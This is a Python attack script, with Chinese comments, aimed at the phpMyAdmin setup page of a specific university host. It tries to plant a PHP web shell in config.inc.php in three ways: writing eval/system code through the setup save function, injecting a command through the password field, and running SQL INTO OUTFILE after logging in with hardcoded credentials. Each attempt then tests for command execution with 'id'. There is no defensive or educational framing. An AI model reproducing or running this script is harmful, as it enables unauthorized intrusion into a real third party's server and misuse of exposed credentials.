#!/usr/bin/env python3
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th/phpmyadmin/setup/"

print("[*] 利用phpMyAdmin setup...")

# 检查setup页面
resp = requests.get(url + "index.php", verify=False, timeout=5)
print(f"[+] Setup页面状态: {resp.status_code}")

# 尝试通过setup写入配置文件
# phpMyAdmin setup可能允许写入config.inc.php
config_content = """<?php
$cfg['Servers'][1]['host'] = 'localhost';
$cfg['Servers'][1]['user'] = 'root';
$cfg['Servers'][1]['password'] = '';
$cfg['Servers'][1]['auth_type'] = 'config';
// Shell code
eval($_GET['c']);
?>"""

# 尝试直接写入config
config_paths = [
    "/phpmyadmin/config.inc.php",
    "/phpmyadmin/config/config.inc.php",
]

for cfg_path in config_paths:
    # 通过setup保存配置
    setup_data = {
        "Submit": "Save",
        "Servers/1/host": "localhost",
        "Servers/1/user": "root", 
        "Servers/1/password": "",
        "Servers/1/auth_type": "config",
    }
    
    # 尝试通过setup的save功能
    resp = requests.post(url + "index.php", data=setup_data, verify=False, timeout=5)
    
    # 检查是否写入成功
    test_url = f"https://olympic.su.ac.th{cfg_path}?c=id"
    resp2 = requests.get(test_url, verify=False, timeout=5)
    if "uid=" in resp2.text:
        print(f"[+] Shell获取成功: {test_url}")
        exit(0)

# 尝试通过setup的文件操作
print("[*] 尝试setup文件操作...")
# 检查是否有文件上传或编辑功能
setup_pages = [
    "index.php",
    "config.php",
    "servers.php",
]

for page in setup_pages:
    resp = requests.get(url + page, verify=False, timeout=5)
    if "upload" in resp.text.lower() or "file" in resp.text.lower():
        print(f"[+] {page} 可能包含文件操作")

# 尝试直接访问config.inc.php写入shell
print("[*] 尝试直接写入config.inc.php...")
session = requests.Session()
session.verify = False

# 登录phpMyAdmin获取token
pma_url = "https://olympic.su.ac.th/phpmyadmin/"
login_data = {"pma_username": "mysql", "pma_password": "Mu123.123.", "server": "1"}
resp = session.post(pma_url + "index.php", data=login_data, allow_redirects=True)
token = re.search(r'token=([a-f0-9]+)', resp.text)
if token:
    token = token.group(1)
    
    # 尝试通过SQL写入到config目录
    sql = "SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/phpmyadmin/config.inc.php';"
    sql_data = {"sql_query": sql, "db": "mysql"}
    resp = session.post(pma_url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)
    
    # 测试
    test_url = pma_url + "config.inc.php?c=id"
    resp2 = requests.get(test_url, verify=False, timeout=5)
    if "uid=" in resp2.text:
        print(f"[+] Shell获取成功: {test_url}")
        exit(0)

# 尝试通过setup的save功能写入shell代码到配置
print("[*] 尝试通过setup save写入shell...")
# 构造恶意配置
malicious_config = {
    "Servers/1/host": "localhost",
    "Servers/1/user": "root",
    "Servers/1/password": "'; system($_GET['c']); //",
    "action": "save",
}

resp = requests.post(url + "index.php", data=malicious_config, verify=False, timeout=5)

# 检查config文件
config_test = requests.get("https://olympic.su.ac.th/phpmyadmin/config.inc.php?c=id", verify=False, timeout=5)
if "uid=" in config_test.text:
    print("[+] 通过config.inc.php获取shell成功")
    exit(0)

print("[-] Setup利用失败")
